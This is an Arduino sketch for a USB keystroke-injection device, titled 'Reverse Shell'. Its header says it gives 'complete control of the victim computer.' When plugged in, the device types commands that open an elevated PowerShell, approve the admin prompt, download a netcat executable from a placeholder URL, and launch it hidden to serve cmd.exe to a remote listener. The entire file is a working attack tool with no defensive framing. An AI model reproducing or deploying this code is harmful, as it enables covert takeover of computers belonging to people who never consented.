/*
 * Reverse Shell
 * It gives the complete control of the victim computer.
 * Author - WireBits
 */
 
#include<Keyboard.h>
void setup()
{
 Keyboard.begin();
 delay(1000);
 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("powershell");
 delay(1000);
 Keyboard.press(KEY_LEFT_CTRL);
 Keyboard.press(KEY_LEFT_SHIFT);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.press(KEY_LEFT_ALT);
 Keyboard.press('y');
 Keyboard.releaseAll();
 delay(4000);
 Keyboard.print("cd \\");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1100);
 Keyboard.print("mkdir folder_name; cd folder_name");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1100);
 Keyboard.print("Invoke-WebRequest -Uri \"nctool_url\" -OutFile \"output_file.exe\"");
 delay(1100);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1100);
 Keyboard.print("cmd");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("start /min shell.exe 0.0.0.0 4000 -e cmd.exe -d & exit");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 Keyboard.end();
}
void loop()
{
 //Nothing to do here ;)
}
